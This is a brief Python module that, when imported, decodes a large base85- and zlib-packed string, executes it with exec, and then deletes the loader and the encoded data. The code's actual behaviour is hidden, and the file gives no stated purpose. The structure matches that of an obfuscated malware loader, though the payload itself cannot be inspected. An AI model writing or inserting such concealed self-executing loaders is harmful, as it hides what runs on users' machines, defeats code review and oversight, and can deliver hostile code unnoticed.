
# Obfuscated module
import base64
import zlib
import types

__obfuscated_code = "c%0o<+iu%141M=k2;PGez;nCpr3lasMQ<p!H9?cNq6jpbPPEyQC&_JtApbr}zSMTytl0$v=7(Ht@`ya-AstJR61~b8Ul5jNLTYlxLhX|izVgX9(@b!hII%GcXvXHbW{IjyPbOEV2?LJy=htVG@zwQg>XgqCu~;Cg<Cq^H$#HcjSb+Xy?+x6EP+CmSKDtB42@|RmIbBlDA^A)>H5T;=!;wSqa$VPcpL4VeAu=J5&{~iOrk5lv{7Gs7Qgc5Bs&fe{u$~hs?pXwiq@b4~QY03#ur?f2?h3TV|ClKclRPqyGASNcBosVmi(FE}OwfwSenb!xOmJQT&8^o!K@$5F_?$%}#MMLc`h89Dt<v(Y$gzoOu1nBFFQG308$2Z{gOJ56tWF4O-}=XiT&O2_b2X!xA^g=D5wSg}eA2S6|J(qQ$varHXTrmzY-h!WP@h~24n*J)@_{Mn$3K6hX_i16zra4OV=k&IgKehYynQ!px#HRONgJ>L#Uc!1w`@6*E9{EGmaOgf#vS%nM9U5wc2_320u0fVI=}$G!Cb=k9F!hxo$Otn&pdzYcI>We8QpqSUR5i4cbg9^I$l53ZR55vhMky9q3X~KR|C(c<vkg~V+ff>(#@Bt7*(XheWBj~q!bd_x}YpU-DzRkyw*!a8y0*3!zOQyP)zxqS|#dbD)B4qmQs*tgJvc4MTn$dIa7=f1(IhG)$s2%R3`Ehu?(<O0dbdFXQP9I!pBThcW8345<>DNq~gBB*+-}{2P?-s3_+<lPkeGg6ZLDdd}SG?JyDeSJ(ArnJ4)8C^G#Pp#z%)ohn+6!9DVZ~1ACusJLzRY$3~(Eyxx{Hi@Z^zAGXz9YHw859&71&CXZ9W?*SKPRar<gy(*ib1+sabjeY0OWIXK~Ks%?;w)s~j__1MR#}w+D1D>5F9^pcx!t3Ds{eEXcseLDumBQ1AYOa@xh#kA!yg8ZaWZ#~4EOVMPUNHKnkN=Vvj}}jVcfp&~%=DEu5KS33k(orgZ%liPkD7zsi@j!kYqxhdcwOVtqqXz8C9j;vX7JUqG`#<(?f=IYev_|Vidt{T5AHUA!2"

def __load():
    code = zlib.decompress(base64.b85decode(__obfuscated_code))
    module_code = compile(code, __file__, 'exec')
    module_globals = globals()
    exec(module_code, module_globals)

__load()
del __load
del __obfuscated_code
